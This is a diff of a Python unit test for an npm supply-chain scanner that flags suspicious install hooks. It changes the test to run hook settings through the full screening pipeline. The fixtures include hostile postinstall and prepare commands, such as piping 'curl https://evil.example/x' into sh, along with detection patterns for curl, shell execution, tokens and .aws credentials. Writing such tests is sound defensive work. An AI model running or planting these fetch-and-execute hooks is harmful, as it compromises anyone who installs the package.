@@ -342,19 +342,31 @@ class MovedSelftestUnits(unittest.TestCase):
 
     def test_install_hook_prepare_decision_and_self_hooks(self):
         pat = {"network": [r"curl"], "exec": [r"\bsh\b"], "env_read": [r"TOKEN"], "credential_paths": [r"\.aws"], "ai_cli_abuse": []}
-        dec = {"any_network_and_exec": "block", "exec_only": "advisory"}
-        fp = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"},
-                                     patterns=pat, npm_scripts=["preinstall", "install", "postinstall", "prepare"], decision=dec)
-        self.assertEqual(fp["policy_tier"], "blocking")
-        fa = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"},
-                                     patterns=pat, npm_scripts=["postinstall"], decision=dec)
-        self.assertEqual(fa["policy_tier"], "advisory")
-        fb = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"},
-                                     patterns=pat, npm_scripts=["postinstall"], decision={"exec_only": "block"})
-        self.assertEqual(fb["policy_tier"], "blocking")
-        self.assertIsNone(gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"},
-                                                  patterns=pat, npm_scripts=["preinstall", "install", "postinstall"], decision=dec))
+        dec_default = {"any_network_and_exec": "block", "exec_only": "advisory"}
         with tempfile.TemporaryDirectory() as d:
+            D, C = pathlib.Path(d, "proj").resolve(), pathlib.Path(d, "cfg").resolve()
+            D.mkdir()
+            (D / "package.json").write_text('{"dependencies": {"express": "4.21.2"}}\n', encoding="utf-8")
+            shutil.copytree(ROOT / "config/slopsquat", C / "config/slopsquat")
+            shutil.copy(ROOT / "vibesec.yaml", C / "vibesec.yaml")
+            (C / "config/slopsquat/allowlist.yaml").write_text("version: 1\nentries: []\n", encoding="utf-8")
+
+            def run_with_hook_cfg(scripts_in_pkg, npm_scripts, decision):
+                (C / "config/slopsquat/cooldown.yaml").write_text(yaml.safe_dump({
+                    "install_hooks": {"suspicious_patterns": pat, "npm_scripts": npm_scripts, "decision": decision},
+                }), encoding="utf-8")
+                reg = gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean(scripts=scripts_in_pkg)})
+                env = gs.build_env(Policy(ROOT, project_root=D), git=FakeGit(), registry=reg, config_root=C)
+                return gs.screen(gs.Request(target=D, manifests=("package.json",)), env).findings
+
+            fp = run_with_hook_cfg({"prepare": "curl x | sh"}, ["preinstall", "install", "postinstall", "prepare"], dec_default)
+            self.assertEqual([f["policy_tier"] for f in fp], ["blocking"])
+            fa = run_with_hook_cfg({"postinstall": "node build.js | sh"}, ["postinstall"], dec_default)
+            self.assertEqual([f["policy_tier"] for f in fa], ["advisory"])
+            fb = run_with_hook_cfg({"postinstall": "node build.js | sh"}, ["postinstall"], {"exec_only": "block"})
+            self.assertEqual([f["policy_tier"] for f in fb], ["blocking"])
+            self.assertEqual(run_with_hook_cfg({"prepare": "curl x | sh"}, ["preinstall", "install", "postinstall"], dec_default), ())
+
             pj = pathlib.Path(d, "package.json")
             pj.write_text(json.dumps({"scripts": {"postinstall": "curl https://evil.example/x | sh"}}), encoding="utf-8")
             self.assertIsNotNone(gs.self_install_hooks(self.env, pj))
